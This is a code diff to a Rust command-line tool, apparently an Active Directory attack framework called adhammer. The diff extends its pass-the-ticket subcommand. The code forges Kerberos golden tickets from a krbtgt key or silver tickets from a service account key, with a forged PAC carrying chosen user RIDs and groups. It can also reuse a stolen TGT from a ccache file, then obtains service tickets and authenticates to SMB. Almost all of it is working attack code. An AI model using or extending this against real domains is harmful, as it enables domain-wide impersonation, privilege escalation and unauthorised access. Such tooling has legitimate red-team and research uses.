@@ -1,7 +1,7 @@
-//! Pass-the-ticket (PtT): forge a golden or silver ticket, obtain a service
-//! ticket for the SPN, and authenticate to SMB with a Kerberos AP-REQ — the
-//! end-to-end proof that a forged ticket grants access. Internal struct/fn
-//! stay named `Pth*` for the 1.3.10 subcommand rename (`pth` → `ptt`).
+//! Pass-the-ticket (PtT): forge a golden or silver ticket, or load a real TGT from a
+//! ccache (`--ccache`), get a service ticket for the SPN and authenticate to SMB with a
+//! Kerberos AP-REQ. Internal struct/fn stay named `Pth*` for the 1.3.10 subcommand
+//! rename (`pth` -> `ptt`).
 
 use crate::ui;
 use anyhow::{Context, Result};
@@ -18,15 +18,18 @@ pub(crate) struct PthArgs {
     /// Kerberos realm (e.g. CORP.LOCAL).
     #[arg(long)]
     pub realm: String,
-    /// Domain SID (S-1-5-21-a-b-c).
+    /// Domain SID (S-1-5-21-a-b-c). Needed for PAC forging, ignored with --ccache.
     #[arg(long)]
-    pub domain_sid: String,
-    /// Golden mode: krbtgt AES256 key (64 hex). Mutually exclusive with --service-aes256.
+    pub domain_sid: Option<String>,
+    /// Golden mode: krbtgt AES256 key (64 hex).
     #[arg(long)]
     pub krbtgt_aes256: Option<adhammer_core::SecretString>,
     /// Silver mode: target service account AES256 key (64 hex).
     #[arg(long)]
     pub service_aes256: Option<adhammer_core::SecretString>,
+    /// Real-ticket mode: MIT ccache holding a TGT (e.g. from `kerb pkinit`).
+    #[arg(long)]
+    pub ccache: Option<String>,
     /// Forge RC4-HMAC (etype 23) — interpret the given key as an NT hash (32 hex; legacy DCs).
     #[arg(long)]
     pub rc4: bool,
@@ -87,14 +90,6 @@ async fn pth_impl(a: PthArgs, checklist: &mut ui::StageChecklist) -> Result<()> 
     use adhammer_kerberos::pac::ForgeIdentity;
     use smb2_client::SmbClient;
 
-    let subs: Vec<u32> = a
-        .domain_sid
-        .trim_start_matches("S-1-5-")
-        .split('-')
-        .map(|x| x.parse::<u32>())
-        .collect::<std::result::Result<_, _>>()
-        .context("--domain-sid must be S-1-5-21-a-b-c")?;
-    checklist.record_ok("parse domain SID", format!("→ {}", a.domain_sid));
     let spn = a.spn.clone().unwrap_or_else(|| format!("cifs/{}", a.host));
     // Kerberos SPNs are registered against hostnames/FQDNs — never against IPs. Save the user
     // a `KDC_ERR_S_PRINCIPAL_UNKNOWN` roundtrip by front-checking.
@@ -105,46 +100,77 @@ async fn pth_impl(a: PthArgs, checklist: &mut ui::StageChecklist) -> Result<()> 
              `--host <fqdn>` (e.g. dc.corp.local) or `--spn cifs/<fqdn>` explicitly."
         );
     }
-    let id = ForgeIdentity {
-        user: a.user.clone(),
-        rid: a.rid,
-        primary_gid: 513,
-        group_rids: a.groups.clone(),
-        domain_subauths: subs,
-        logon_server: a.realm.split('.').next().unwrap_or("DC").to_uppercase(),
-        logon_domain: a.realm.split('.').next().unwrap_or("DOMAIN").to_uppercase(),
-        extra_sids: vec![],
-    };
 
-    // Build the service ticket: golden → TGS-REQ; silver → forged directly.
-    let st = match (&a.krbtgt_aes256, &a.service_aes256) {
-        (Some(k), None) => {
-            let key = crate::parse_forge_key(k, a.rc4)?;
-            let kdc = a.kdc.clone().unwrap_or_else(|| a.host.clone());
-            let tgt = adhammer_kerberos::forge_golden_tgt(&id, &a.realm, &key, a.rc4)?;
-            println!("[+] forged golden TGT for {}@{}", a.user, a.realm);
-            let st = adhammer_kerberos::get_service_ticket(&tgt, &spn, &kdc).await?;
-            println!("[+] got service ticket for {spn} (KDC accepted the golden TGT)");
-            checklist.record_ok(
-                "build service ticket (golden→TGS-REQ or silver forge)",
-                format!("golden → KDC accepted, TGS for {spn}"),
-            );
-            st
+    let st = if let Some(ccache_path) = a.ccache.as_deref() {
+        anyhow::ensure!(
+            a.krbtgt_aes256.is_none() && a.service_aes256.is_none(),
+            "--ccache is mutually exclusive with --krbtgt-aes256/--service-aes256"
+        );
+        checklist.record_skipped("parse domain SID", "--ccache reuses the ticket's real PAC");
+        let bytes = std::fs::read(ccache_path)
+            .with_context(|| format!("read --ccache {ccache_path}"))?;
+        let tgt = adhammer_kerberos::ccache::load_tgt(&bytes)
+            .with_context(|| format!("parse ccache {ccache_path}"))?;
+        println!("[+] loaded TGT for {}@{} from {ccache_path}", a.user, tgt.crealm());
+        let kdc = a.kdc.clone().unwrap_or_else(|| a.host.clone());
+        let st = adhammer_kerberos::get_service_ticket(&tgt, &spn, &kdc).await?;
+        println!("[+] got service ticket for {spn} (KDC accepted the real TGT)");
+        checklist.record_ok(
+            "build service ticket (golden→TGS-REQ or silver forge)",
+            format!("ccache → KDC accepted, TGS for {spn}"),
+        );
+        st
+    } else {
+        let domain_sid = a.domain_sid.as_deref().ok_or_else(|| {
+            anyhow::anyhow!("--domain-sid is required for --krbtgt-aes256/--service-aes256")
+        })?;
+        let subs: Vec<u32> = domain_sid
+            .trim_start_matches("S-1-5-")
+            .split('-')
+            .map(|x| x.parse::<u32>())
+            .collect::<std::result::Result<_, _>>()
+            .context("--domain-sid must be S-1-5-21-a-b-c")?;
+        checklist.record_ok("parse domain SID", format!("→ {domain_sid}"));
+        let id = ForgeIdentity {
+            user: a.user.clone(),
+            rid: a.rid,
+            primary_gid: 513,
+            group_rids: a.groups.clone(),
+            domain_subauths: subs,
+            logon_server: a.realm.split('.').next().unwrap_or("DC").to_uppercase(),
+            logon_domain: a.realm.split('.').next().unwrap_or("DOMAIN").to_uppercase(),
+            extra_sids: vec![],
+        };
+        match (&a.krbtgt_aes256, &a.service_aes256) {
+            (Some(k), None) => {
+                let key = crate::parse_forge_key(k, a.rc4)?;
+                let kdc = a.kdc.clone().unwrap_or_else(|| a.host.clone());
+                let tgt = adhammer_kerberos::forge_golden_tgt(&id, &a.realm, &key, a.rc4)?;
+                println!("[+] forged golden TGT for {}@{}", a.user, a.realm);
+                let st = adhammer_kerberos::get_service_ticket(&tgt, &spn, &kdc).await?;
+                println!("[+] got service ticket for {spn} (KDC accepted the golden TGT)");
+                checklist.record_ok(
+                    "build service ticket (golden→TGS-REQ or silver forge)",
+                    format!("golden → KDC accepted, TGS for {spn}"),
+                );
+                st
+            }
+            (None, Some(k)) => {
+                let key = crate::parse_forge_key(k, a.rc4)?;
+                let tgt = adhammer_kerberos::forge_silver_tgt(&id, &a.realm, &key, &spn, a.rc4)?;
+                println!("[+] forged silver ticket for {spn}");
+                let st = adhammer_kerberos::silver_service_ticket(&tgt, &spn);
+                checklist.record_ok(
+                    "build service ticket (golden→TGS-REQ or silver forge)",
+                    format!("silver → forged for {spn}"),
+                );
+                st
+            }
+            _ => anyhow::bail!(
+                "provide exactly one of --krbtgt-aes256 (golden), --service-aes256 (silver), \
+                 or --ccache (real TGT)"
+            ),
         }
-        (None, Some(k)) => {
-            let key = crate::parse_forge_key(k, a.rc4)?;
-            let tgt = adhammer_kerberos::forge_silver_tgt(&id, &a.realm, &key, &spn, a.rc4)?;
-            println!("[+] forged silver ticket for {spn}");
-            let st = adhammer_kerberos::silver_service_ticket(&tgt, &spn);
-            checklist.record_ok(
-                "build service ticket (golden→TGS-REQ or silver forge)",
-                format!("silver → forged for {spn}"),
-            );
-            st
-        }
-        _ => anyhow::bail!(
-            "provide exactly one of --krbtgt-aes256 (golden) or --service-aes256 (silver)"
-        ),
     };
 
     let (blob, key) = adhammer_kerberos::build_ap_req_gss(&st)?;
